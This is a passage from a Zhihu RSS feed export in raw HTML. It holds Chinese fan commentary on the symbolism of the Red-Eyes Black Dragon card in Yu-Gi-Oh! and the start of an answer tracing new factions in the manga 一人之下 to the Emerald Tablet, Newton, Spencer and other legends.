data-original-src=\"v2-300c32bd0ebf2424d72757004c30d78b\" data-watermark-src=\"v2-a57ffe72cba93f1e92467fb13548b591\" data-private-watermark-src=\"v2-356bd45eb67ec616cd0d7e7c514e1dda\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9a5198ca905345febe360d7f8abaf431_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9a5198ca905345febe360d7f8abaf431\" data-watermark-src=\"v2-6218f9d0dc4a74ae5a5f4d24fcd3f777\" data-private-watermark-src=\"v2-b77920fd51f3705ba782613908c5539c\"></p>\n<p>这里开始切入主题了。真正的决斗者不是靠稀有卡，而是靠自身的斗志，和相信胜利的可能性。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f48477eb153f2137d5a6ca88ddde7299_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-f48477eb153f2137d5a6ca88ddde7299\" data-watermark-src=\"v2-1924854fa64cd296123530d8925e2dbf\" data-private-watermark-src=\"v2-2dda31921ba894894426baa75313fed8\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-01b60dea8154a8ae06e08572e36ba52e_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-01b60dea8154a8ae06e08572e36ba52e\" data-watermark-src=\"v2-b4c937bc9be531ff0cac1a737678e7fc\" data-private-watermark-src=\"v2-11649c36d8f534676845ea98862b7108\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3dca4ecafcff91cecf94f07e412e75f5_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3dca4ecafcff91cecf94f07e412e75f5\" data-watermark-src=\"v2-807892f8679fedb0eee7f733bc000478\" data-private-watermark-src=\"v2-6a490e4a309b5ce61801ef11bef132f3\"></p>\n<p>这段台词是整部《真红眼黑龙》的核心。“可能性”既是黑龙带来的，也是决斗者带来的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b199dba4d6b81b6b7c2a2cfd918f6d10_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b199dba4d6b81b6b7c2a2cfd918f6d10\" data-watermark-src=\"v2-aafc58514796dc2f65841d4667f0dad6\" data-private-watermark-src=\"v2-49f7db76007d200e0cb58fdc6426f4cb\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-12f0f67e06b7f4d0b961cfd9ffff3e99_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-12f0f67e06b7f4d0b961cfd9ffff3e99\" data-watermark-src=\"v2-76b4103dc057562909ebda916f22d3c6\" data-private-watermark-src=\"v2-3f264c847c31584ebedd1eef63e8b049\"></p>\n<p>顿悟的翔吾鼓起勇气并传达给王样。王样终于召唤出真红眼黑龙。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c7a5c7b45ce9cd8ca46e78bdffcbab51_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c7a5c7b45ce9cd8ca46e78bdffcbab51\" data-watermark-src=\"v2-6fb212ffaa8a00d8033e28306c3dbfdc\" data-private-watermark-src=\"v2-061acdd03e59ab0fa514f14d58401a45\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b75e5b2375bcc62beed90c69dc3b4998_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b75e5b2375bcc62beed90c69dc3b4998\" data-watermark-src=\"v2-1544740aea36eda0567606cf46800e4c\" data-private-watermark-src=\"v2-0848dd652d92c968435a2fb1445d4c1f\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d444634dfbc07b76e4593d8560521d59_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d444634dfbc07b76e4593d8560521d59\" data-watermark-src=\"v2-a3cd9ccc3a20ae738c5f98ff4da32a53\" data-private-watermark-src=\"v2-bc434c67a1bd6b931e26dd1c76b50638\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2599b082deb8ac5c855410a767f939e3_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2599b082deb8ac5c855410a767f939e3\" data-watermark-src=\"v2-ce75647a7cfef51e565f41b8a7d4fceb\" data-private-watermark-src=\"v2-46058fba60dd940bd3c3bb0fa53cb3dc\"></p>\n<p>出场时的气势还是很赞的。但是……</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-28b4a3f22eaa96d16e3dd2f0461b1f78_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-28b4a3f22eaa96d16e3dd2f0461b1f78\" data-watermark-src=\"v2-9663b0345331ed36d4e6ab0916639634\" data-private-watermark-src=\"v2-baa6ad6a253eb57061de3aac6d00549e\"></p>\n<p>马上就被拿来融合了。</p>\n<p><br></p>\n<p>真红眼和王样场上的流星龙融合，成了流星黑龙。没错，不仅流星黑龙其实是王样用出来的，流星龙也是。不动游星是谁？不太熟啊。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-21644bdec8494533f4d5ca74c849e9e1_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-21644bdec8494533f4d5ca74c849e9e1\" data-watermark-src=\"v2-1be39fc4c49833734b715f95a4d9c401\" data-private-watermark-src=\"v2-a03461db1e2d7ad27582fc2c57f79768\"></p>\n<p>流星黑龙击败青眼白龙3体连接，打败海马。从这场战斗中得到勇气的翔吾也能正常的打牌了。以前欺负他的大孩子也成为了朋友。故事结束。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a731ad00351e78791660f0fd831af552_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"408\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a731ad00351e78791660f0fd831af552\" data-watermark-src=\"v2-668313755bd6f67fffc47bf8d7a4d8ac\" data-private-watermark-src=\"v2-8d47c374e0ceaa9164b723b08b20da27\"></p>\n<p><br></p>\n<p><br></p>\n<p>这个剧场版除了赋予“白龙带来胜利，黑龙带来可能性”这个象征意义外，还通过这个故事把真红眼与决斗者的斗志绑在了一起。当然，这是因为原作剧情后来真红眼成了城之内的卡。对于城之内这么一个从区大赛8强起步，一步步打成决斗城市准决赛的底层励志角色来说，斗志、可能性，形容的既是真红眼，也是城之内本人。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-19e3732cb72fd604fd3360ffd54d24a4_720w.jpg?rss\" data-rawwidth=\"417\" data-rawheight=\"613\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-19e3732cb72fd604fd3360ffd54d24a4\" data-watermark-src=\"v2-5f4749a46372bb0705dfdce610b9e6de\" data-private-watermark-src=\"v2-0ee58a90d087c32beab8034cea7ce063\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bab92ffcdfde35c55ab16b9fca0b453a_720w.jpg?rss\" data-rawwidth=\"1982\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bab92ffcdfde35c55ab16b9fca0b453a\" data-watermark-src=\"v2-d9431e0a6137d2f3de9c7c71a95f21d2\" data-private-watermark-src=\"v2-780680b647173086b1f2d480a43b518d\"></p>\n<p>在决斗城市开幕期间，城之内认为自己实力还配不上使用真红眼，将其交给了王样保管，由此这张卡也成为了代表2人羁绊的卡。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4727bd92b988637efd4eb30e7b7a4c2a_720w.jpg?rss\" data-rawwidth=\"2030\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4727bd92b988637efd4eb30e7b7a4c2a\" data-watermark-src=\"v2-9125de54350c74c73eee1fd89e77cf0c\" data-private-watermark-src=\"v2-4f754c590e77042ff779f51d39208a98\"></p>\n<p>城之内被马利克洗脑进行的码头决斗时，表君用手札对换来尝试唤醒城之内。城之内残存的意识还记得自己的承诺，一定要到自己能成为独当一面的决斗者时，才能取回真红眼。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4bcd781376eec0f31f1556429e134f78_720w.jpg?rss\" data-rawwidth=\"2034\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4bcd781376eec0f31f1556429e134f78\" data-watermark-src=\"v2-f113a8cd8a74bd65dfda830b4a87d453\" data-private-watermark-src=\"v2-6e835710a90c7b1ecfbba4a5df64f23a\"></p>\n<p>这段剧情让真红眼成了2人羁绊的见证。并在之后的决斗城市准决赛上，真红眼在场上提升超魔导剑士攻击力，帮助王样战胜海马。</p>\n<p>小tips：其实在游戏王原作里，真红眼在王样手上的戏份比在城之内那还多些。因为整个决斗城市篇它都在王样卡组里，而决斗城市篇之后城之内也没有再决斗过了。</p>\n<p><br></p>\n<p>综上所述，一开始，真红眼黑龙这张卡的意义只是在剧情设定上的超高地位，但后续无论原作剧情还是动画原创的剧场版剧情，都在为其增添它的象征意义。到如今留在我们记忆里的真红眼黑龙，它就如同景山东坡的老歪脖子树，所携带的那些故事就已经让它充满了历史价值，本身故事设定的稀有度什么的反而不重要了。如同《真红眼黑龙》中所描绘的，卡片再稀有、再强大，终究只是卡片。决斗者最强大的武器，是自己的心。</p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ai-xie-71-25?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">艾叶</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/24348322/answer/1971729872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">36 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/431039255?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问有类似心灵崩坏的游戏王卡片推荐一下吗？</a><br><a href=\"http://www.zhihu.com/question/444088245?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏王对战中，卡片不会成为卡片效果对象和不会被魔法陷阱怪兽效果影响这两个描述本质上有什么不同吗？</a><br>\n","link":"http://www.zhihu.com/question/24348322/answer/1971729872?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《一人之下》第533（566）话？","date":"2021-07-02 11:30:09","description":"\n<p>漫画533（566）话出现了许多新势力，从个人而言是开心的，这说明一人的格局并没有被完全被甲申之乱和三十六贼束缚；时至今日还在开辟新的世界；人外有人，天外有天；这才更像一个真实的世界；所以这里从个人角度来尝试着寻找一下这些世界势力的原型；</p>\n<blockquote>\n<i><b>观前提醒：</b>1，本文是以《一人之下》漫画和手游为基础做的简单整理；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i><br><i>2，文中涉及的历史，符文以及各门派的简介，都是仅在一人之下世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i> <br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-55d320a66f7bb4ee4ebcf362c60e66ae_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"339\" data-watermark=\"watermark\" data-original-src=\"v2-55d320a66f7bb4ee4ebcf362c60e66ae\" data-watermark-src=\"v2-d269b95f035e43ad2174831b9c493427\" data-private-watermark-src=\"v2-43a44f8c14b7d89ab162d7f7e5f088d1\"></p>\n<p><i>如果有时间也可以先看之前做的漫画 </i>531（565）话之前世界异人的总结；</p>\n<a href=\"https://zhuanlan.zhihu.com/p/381719463\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-b68b2071ca06cb01c14181e72308f3b9_720w.jpg\" data-entity-type=\"article\" data-entity-data=\"null\" class=\"internal\">【一人之下】——世界异人汇总(截止漫画531话）</a><h2>目录</h2>\n<p><b>引子</b></p>\n<p><b>翡翠学会</b></p>\n<p>1.翠玉录</p>\n<p>2.牛顿</p>\n<p>3.斯宾塞</p>\n<p><b>大地之子</b></p>\n<p>1.盖亚</p>\n<p>2.那罗伽</p>\n<p>3.地母神</p>\n<p><b>异人馆</b></p>\n<p>1.九属会馆</p>\n<p>2.查侬</p>\n<p><b>石川流</b></p>\n<p>1.石川家</p>\n<p>2.妖刀蛭丸</p>\n<p><b>贝希摩斯</b></p>\n<p>1.贝希摩斯</p>\n<p>2.工业法器</p>\n<p>3.美国工会</p>\n<p><b>纳森岛</b></p>\n<p>1.阿方索</p>\n<p>2.纳森王</p>\n<p>3.投石问路</p>\n<p><b>个人想法</b></p>\n<p><br></p>\n<hr>\n<p><br></p>\n<h2>引子</h2>\n<p>漫画533（566）话出现了许多新势力，我们知道在中国有哪都通管理全国异人，那世界的其他地方，是什么样的组织在管理各方异人呢？虽然现在我们只了解到他们的名字，但是其实其中的许多名字都可以在现实世界中的世界传说和各国组织中找到一定的相似之处；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-99d1b90fef8afc45e57917b59929553d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"182\" data-watermark=\"watermark\" data-original-src=\"v2-99d1b90fef8afc45e57917b59929553d\" data-watermark-src=\"v2-2d79ff4b65d21566f78d5d279f663661\" data-private-watermark-src=\"\"></p>\n<h2><b>翡翠学会</b></h2>\n<p><b>1.翠玉录</b></p>\n<p>不出意外的话，这个翡翠学会的来源应该就是源自传说中的《翠玉录》；（overlord中雅儿贝德三姐妹的制作者的ID也是借鉴了这一原型。）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-822c348e1572cea26cd15e67a6bc5b8a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-822c348e1572cea26cd15e67a6bc5b8a\" data-watermark-src=\"v2-ef5958deabdd11be483090a355c70ed4\" data-private-watermark-src=\"\"></p>\n<p>那么为什么《翠玉录》在西方那么有名呢？传说西方炼金术起源自埃及。公元前1900年。埃及法老赫耳墨斯以及他传说中的父亲透特神以及赫尔墨斯的大儿子大祭祀塔特三代神明将所有炼金术的知识浓缩为13句话，雕刻在一块翠绿的祖母绿宝石板上，流传于人世。因此《翠玉录》也被称为翠玉十三章，这篇文字被认为是西方炼金术的源头和鼻祖；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7d70b9fe6f8ba8551e8972003a3120f9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"183\" data-watermark=\"watermark\" data-original-src=\"v2-7d70b9fe6f8ba8551e8972003a3120f9\" data-watermark-src=\"v2-522f2a0565a50e43b93f8cca1a50e891\" data-private-watermark-src=\"\"></p>\n<p>那么这《翠玉录》中究竟说了什么呢？这里列出一下这十三句话；「内容来源网络侵删」</p>\n<blockquote>作者：艾萨克·牛顿<br>名称：《翠玉录》<br>链接：<a href=\"http://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%25E7%25BF%25A0%25E7%258E%2589%25E5%25BD%2595/4579712%3Ffr%3Daladdin\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">翠玉录（词语）_百度百科</a>\n</blockquote>\n<p>1. 真实不虚，永不说谎，必然带来真实： Tis true without lying, certain &amp; most true: </p>\n<p>2.下如同上，上如同下；依此成全太一的奇迹。 That which is below is like that which is above and that which is above is like that which is below to do ye miracles of one only thing. </p>\n<p><img src=\"https://pic2.zhimg.com/v2-056394ea9819060893fce95be44c2cd5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1368\" data-rawheight=\"291\" data-watermark=\"watermark\" data-original-src=\"v2-056394ea9819060893fce95be44c2cd5\" data-watermark-src=\"v2-58b8d6304a790d20bbf27e8168c4f82c\" data-private-watermark-src=\"\"></p>\n<p>3.万物本是太一，借由分化从太一创造出来。 And as all things have been and arose from one by ye mediation of one: so all things have their birth from this one thing by adaptation. </p>\n<p>4.太阳为父，月亮为母，从风孕育，从地养护。 The Sun is its father, the moon its mother, the wind hath carried it in its belly, the earth its nourse. </p>\n<p><img src=\"https://pic4.zhimg.com/v2-40fbb54e67a0c76c9c032fc511db5653_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1376\" data-rawheight=\"307\" data-watermark=\"watermark\" data-original-src=\"v2-40fbb54e67a0c76c9c032fc511db5653\" data-watermark-src=\"v2-f8b961b14317862800cf5c969ef445f7\" data-private-watermark-src=\"\"></p>\n<p>5.世间一切完美之源就在此处；其能力在地上最为完全。 The father of all perfection in ye whole world is here. Its force or power is entire if it be converted into earth. </p>\n<p> 6.分土于火，萃精于糙，谨慎行之。 Separate thou ye earth from ye fire, ye subtile from the gross sweetly wth great indoustry.</p>\n<p><img src=\"https://pic4.zhimg.com/v2-68374bc3f7806cffda9ebe0151eb9cf3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1369\" data-rawheight=\"340\" data-watermark=\"watermark\" data-original-src=\"v2-68374bc3f7806cffda9ebe0151eb9cf3\" data-watermark-src=\"v2-452e645e879f66f710d2de25786324fe\" data-private-watermark-src=\"\"></p>\n<p> 7.从地升天，又从天而降，获得其上、其下之能力。 It ascends from ye earth to ye heaven &amp; again it desends to ye earth and receives ye force of things superior &amp; inferior.</p>\n<p> 8.如此可得世界的荣耀、远离黑暗蒙昧。 By this means you shall have ye glory of ye whole world &amp; thereby all obscurity shall fly from you. </p>\n<p>9.此为万力之力，摧坚拔韧。 Its force is above all force, for it vanquishes every subtile thing &amp; penetrates every solid thing. </p>\n<p><img src=\"https://pic3.zhimg.com/v2-947ea6ae74491d720e667c75b0d9cbd4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1382\" data-rawheight=\"414\" data-watermark=\"watermark\" data-original-src=\"v2-947ea6ae74491d720e667c75b0d9cbd4\" data-watermark-src=\"v2-deed0e5111f61fb75f7db2ad64c35be6\" data-private-watermark-src=\"\"></p>\n<p>10.世界即如此创造。 So was ye world created. </p>\n<p>11.依此可达奇迹。 From this are &amp; do come admirable adaptations whereof ye process is here in this. </p>\n<p>12.我被称为三重伟大的赫尔墨斯，因我拥有世界三部分的智慧。 Hence I am called Hermes Trismegist, having the three parts of ye philosophy of ye whole world. </p>\n<p>13.这就是我所说的伟大工作。 That which I have said of ye operation of ye Sun is accomplished &amp; ended.</p>\n<p>以上就是英文版与中文版的《翠玉录》了（原文是拉丁文的），炼金术士认为太阳指的是不朽的精神，月亮指的是低层次的自我，是高我的投影。风是指灵性的生命力，地是指物质的躯体。炼金就是指神性与躯体的联合、精神和物质的统一；（信息来源于网络）如果这个解读角度合理的话，那这一点从和中国修炼中的性命双修其实也是异曲同工的；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e8fa1861ff79a39fddf8d43671a5b926_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"191\" data-watermark=\"watermark\" data-original-src=\"v2-e8fa1861ff79a39fddf8d43671a5b926\" data-watermark-src=\"v2-1b78b5442e9ce51713fb675f6d84b8bc\" data-private-watermark-src=\"\"></p>\n<p><b>2.牛顿</b></p>\n<p>在研究和解读《翠玉录》的人中，最有名的要数著名科学家艾萨克·牛顿了；传说上文引用的英文翻译就是他所做的；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-be2e55e5fa3b416ae8ffa60b286cc9ab_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"779\" data-rawheight=\"366\" data-watermark=\"watermark\" data-original-src=\"v2-be2e55e5fa3b416ae8ffa60b286cc9ab\" data-watermark-src=\"v2-0b368f26cc81c6f38cfbf827c85aecf4\" data-private-watermark-src=\"\"></p>\n<p>这位站立在巫术终结和科学兴起的历史转折点上的天才，通过对未知世界永无止境的探索，使他成为有史以来最伟大的科学家之一，也使他将自己一生中更多的精力花费在炼金术上，牛顿总共留下50多万英文单词的炼金术手稿和100多万单词的神学手稿，而这些工作与他的科学发现很难说是毫无关联的。值得注意的是塔伯院长与牛顿同名也叫艾萨克；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-379fbcbf8f9950c6140295ba763d09a6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"218\" data-watermark=\"watermark\" data-original-src=\"v2-379fbcbf8f9950c6140295ba763d09a6\" data-watermark-src=\"v2-24464dcdf2abdfc37df1bbbfe2e0bf06\" data-private-watermark-src=\"\"></p>\n<p>从之前的怀念画面也可以看出，弗拉梅尔学院和塔伯院长可能也曾隶属于欧洲翡翠学会；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-914b18a24c49ce0865032affa1e92e20_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"190\" data-watermark=\"watermark\" data-original-src=\"v2-914b18a24c49ce0865032affa1e92e20\" data-watermark-src=\"v2-c89b8b37d6217141e65e3d4b56e6b6bc\" data-private-watermark-src=\"\"></p>\n<p><b>3.斯宾塞</b></p>\n<p>这位欧洲翡翠学会的理事叫做威廉斯宾塞；威廉是一个非常常见的西方名字；而历史上也有一位比较著名的斯宾塞；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bef177f905feaa58d87b0df1ce44032f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"159\" data-watermark=\"watermark\" data-original-src=\"v2-bef177f905feaa58d87b0df1ce44032f\" data-watermark-src=\"v2-36a9bc65b675dd9c5091b8a4562fe1ba\" data-private-watermark-src=\"\"></p>\n<p>赫伯特·斯宾塞；英国哲学家、社会学家、教育家。他为人所共知的就是“社会达尔文主义之父”，所提出一套的学说把进化理论适者生存应用在社会学上尤其是教育及阶级斗争，是在理论上阐述进化论的英国哲学家先驱。也是艺术起源中游戏说的提出者（游戏说认为：艺术是天赋者内心剩余精力的发泄）；上期提到弗雷泽，这次提到斯宾塞，二叔难不成在研究艺术史？（个人猜想）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d01fa95a61de33b56d2edc6dc15db35e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"668\" data-rawheight=\"334\" data-watermark=\"watermark\" data-original-src=\"v2-d01fa95a61de33b56d2edc6dc15db35e\" data-watermark-src=\"v2-0583761f101e4514d12659d11ff398ac\" data-private-watermark-src=\"\"></p>\n<p>对了，斯宾塞认为：教育的目的和任务在于教导每一个人怎样去过“完美”的生活。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-93274408b1148217e8aa69e832be1de0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"153\" data-watermark=\"watermark\" data-original-src=\"v2-93274408b1148217e8aa69e832be1de0\" data-watermark-src=\"v2-84174332148a9b658743bb11d40655ca\" data-private-watermark-src=\"\"></p>\n<h2><b>大地之子</b></h2>\n<p>说实话，结合人种妆容服饰，这位莉莉娅会长以及她所在大地之子工会都没有太多的可以确定的东西；只能说个人感觉更接近南美或北非的服饰风格（个人猜测）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-05c620f5cf8bcb5570e3185e079d47de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-05c620f5cf8bcb5570e3185e079d47de\" data-watermark-src=\"v2-183738600455eac099cba3213058c2b3\" data-private-watermark-src=\"\"></p>\n<p><b>1.盖亚</b></p>\n<p>同样的，大地之子也并没有太多联想到的线索，如果有其他想法法朋友欢迎在评论区写出；非要说的话，北非南美宗教受希腊影响出现的盖亚崇拜可能与之有那么一点关联；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b39ff62096684d4180411a3d27eb4031_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"664\" data-rawheight=\"265\" data-watermark=\"watermark\" data-original-src=\"v2-b39ff62096684d4180411a3d27eb4031\" data-watermark-src=\"v2-39b2ae92c46435073ec77a097af9bc07\" data-private-watermark-src=\"\"></p>\n<p>盖亚：也是希腊神话中第一位超原始神明，她是大地的神格化，是第一位真正意义上的创世神，也是能创造生命的原始自然力之一（大地）。她的出现标志着混沌开始由无序转为有序，也标志着万物开始产生。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3caa769ea33b9b39244e59a088e4b0e9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"232\" data-watermark=\"watermark\" data-original-src=\"v2-3caa769ea33b9b39244e59a088e4b0e9\" data-watermark-src=\"v2-c8e44777b06eec8bc9dacc473d21d1fb\" data-private-watermark-src=\"\"></p>\n<p><b>2.那罗伽</b></p>\n<p>那罗伽是古印度神话中的阿修罗王，也曾被称为：大地之子。他曾将阿底提的耳环盗至其城堡钵罗耆阍奥提娑。后来，黑天受诸天神之托，杀死那罗伽，夺回此宝。而且在梵语中那罗伽被音译为地狱；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fba7c4727a8a97ff0e976d05185e9034_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1151\" data-rawheight=\"409\" data-watermark=\"watermark\" data-original-src=\"v2-fba7c4727a8a97ff0e976d05185e9034\" data-watermark-src=\"v2-13bf891748e55f62c3f37845b9e96aca\" data-private-watermark-src=\"v2-89092d03a30d4ba7b3bafed6ea332535\"></p>\n<p><b>3.地母神</b></p>\n<p>还有知友 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/cff24f1b490a04946b663b40a4584ee3\" data-hash=\"cff24f1b490a04946b663b40a4584ee3\" data-hovercard=\"p$b$cff24f1b490a04946b663b40a4584ee3\">@幻化千叶</a> 提到的：个人理解，大地之子应该是信仰地母神的女巫组织。莉莉娅女士的装扮有明显的吉普赛女巫的特色（头巾和略显浮夸的首饰）。地母神，亦称为大地之母或母神是指专司繁殖力及象征大地恩惠的女神，在这个范畴中并不是所有的女神都能被称呼为地母神。随着一神教的流行，地母神极其祭祀也逐渐沦为魔女或者女巫。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-94632f5746f373f8728301bdf3868f1e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"742\" data-rawheight=\"211\" data-watermark=\"watermark\" data-original-src=\"v2-94632f5746f373f8728301bdf3868f1e\" data-watermark-src=\"v2-7353ad236e55ad11b04de3b4a2a5a641\" data-private-watermark-src=\"v2-5f8faefb9925d4f6a5003325c937dfbf\"></p>\n<p>如果这里的巫女元素匹配，就和之前以利亚弄错的波曼可以相联结（不过波曼属于巫毒体系）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3389f7850e4bb51872774653509cd9cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"739\" data-rawheight=\"284\" data-watermark=\"watermark\" data-original-src=\"v2-3389f7850e4bb51872774653509cd9cd\" data-watermark-src=\"v2-8892881f519566a3a445b29ae57f3eee\" data-private-watermark-src=\"v2-1d2ada378130714191a976f74fa6aae4\"></p>\n<p>如果这里的大地之子不是个比喻句的话，那或许他们的官方也掌握着和节气谷纳森岛类似的仙踪；（个人猜测）</p>\n<h2>异人馆</h2>\n<p>在泰国，有很强的会馆文化，所谓会馆原本是指各地商户在外地互相帮扶的聚集地店；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-10962455d126d341a6d77c422ce0fe71_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1878\" data-rawheight=\"754\" data-watermark=\"watermark\" data-original-src=\"v2-10962455d126d341a6d77c422ce0fe71\" data-watermark-src=\"v2-7ff93898e272fbd7bd09458514b055a8\" data-private-watermark-src=\"\"></p>\n<p><b>1.九属会馆</b></p>\n<p>泰国有九属会馆，九属是：潮州，客家，广府，福建，海南，云南，广西，浙江和台湾；九家会馆。一般是这些地方的华人后裔建立的，他们对中国的了解要比普通泰国人深入的多。但是其实也带有他们独特的视角和宗族理念。尤其是看待来泰国工作投资的中国人，就带有一定的利益连带关系。而与之相似的，所谓异人馆可能就是异人之间相互帮扶的机密组织吧；</p>\n<p><img 